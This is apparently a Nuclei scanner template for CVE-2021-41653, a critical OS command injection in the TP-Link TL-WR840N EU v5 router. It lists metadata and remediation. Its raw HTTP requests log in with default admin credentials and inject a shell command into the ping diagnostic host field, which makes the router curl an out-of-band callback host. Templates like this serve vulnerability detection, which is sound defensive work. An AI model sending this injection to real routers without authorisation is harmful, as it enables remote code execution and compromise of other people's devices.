id: CVE-2021-41653
info:
  name: TP-Link - OS Command Injection
  author: gy741
  severity: critical
  description: The TP-Link TL-WR840N EU v5 router is susceptible to remote code execution
    through a specifically designed payload in an IP address input field due to a
    CVE-2021-41653 and TP-Link OS Command Injection vulnerability.
  reference:
  - https://k4m1ll0.com/cve-2021-41653.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-41653
  - https://www.tp-link.com/us/press/security-advisory/
  remediation: Upgrade the firmware to at least version "TL-WR840N(EU)_V5_211109".
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-41653
    cwe-id: CWE-94
  tags: cve,cve2021,tplink,rce,router
  metadata:
    impact: The impact of CVE-2021-41653 on TP-Link TL-WR840N EU v5 router users is
      the potential for remote code execution via a specially crafted payload in an
      IP address input field.
    recommendation: I recommend updating to the latest firmware version for the TP-Link
      TL-WR840N EU v5 router to mitigate the risk of remote code execution through
      the PING function.
variables:
  useragent: '{{rand_base(6)}}'
requests:
- raw:
  - 'POST /cgi?2 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/plain

    Referer: http://{{Hostname}}/mainFrame.htm

    Cookie: Authorization=Basic YWRtaW46YWRtaW4=


    [IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6

    dataBlockSize=64

    timeout=1

    numberOfRepetitions=4

    host=$(echo 127.0.0.1; curl http://{{interactsh-url}} -H ''User-Agent: {{useragent}}'')

    X_TP_ConnName=ewan_ipoe_d

    diagnosticsState=Requested

    '
  - 'POST /cgi?7 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/plain

    Referer: http://{{Hostname}}/mainFrame.htm

    Cookie: Authorization=Basic YWRtaW46YWRtaW4=


    [ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: word
    part: interactsh_request
    words:
    - 'User-Agent: {{useragent}}'
